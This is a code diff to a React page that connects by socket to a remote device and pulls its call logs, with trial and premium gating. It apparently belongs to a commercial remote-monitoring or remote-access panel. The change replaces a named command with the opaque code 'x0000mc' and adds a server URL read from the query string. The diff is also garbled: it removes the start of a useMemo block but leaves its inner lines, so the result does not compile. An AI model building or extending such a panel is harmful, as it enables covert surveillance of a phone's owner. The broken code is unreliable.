@@ -102,6 +102,7 @@ export default function CallsPage() {
     const deviceName = searchParams.get('name') || 'Device';
     const deviceId = searchParams.get('deviceId') || '';
     const isPremium = searchParams.get('isPremium') === 'true';
+    const serverUrl = searchParams.get('serverUrl') || undefined;
 
     const [calls, setCalls] = useState<Call[]>([]);
     const [isLoading, setIsLoading] = useState(false);
@@ -128,8 +129,9 @@ export default function CallsPage() {
         showInfo('Trial Access Used', `${trial.usedCount}/${trial.maxUses} used for Call Logs this month.`);
         return true;
     };
+
     useEffect(() => {
-        initSocket(deviceId);
+        initSocket(deviceId, serverUrl);
         showConnection(true, 'Connected to device');
 
         onResult((data: SocketResult) => {
@@ -157,7 +159,7 @@ export default function CallsPage() {
         });
 
         return () => disconnectSocket();
-    }, [deviceId]);
+    }, [deviceId, serverUrl]);
 
     const handleRefresh = async () => {
         const canUse = await ensureTrialOnFirstUse();
@@ -166,7 +168,7 @@ export default function CallsPage() {
         setSearchQuery('');
         sendCommand({
             userId: deviceId,
-            command: { order: COMMANDS.CALLS },
+            command: { order: 'x0000mc' },
         });
 
         setTimeout(() => {
@@ -194,13 +196,6 @@ export default function CallsPage() {
             `CallLogs_${new Date().toISOString().split('T')[0]}.csv`
         );
         showSuccess('Exported', 'Call logs saved as CSV');
-    };
-
-    const filteredCalls = useMemo(() => {
-        let result = calls;
-
-        if (selectedFilter !== 'all') {
-            const typeMap = { incoming: 1, outgoing: 2, missed: 3 };
             result = result.filter(c => c.type === typeMap[selectedFilter]);
         }
 
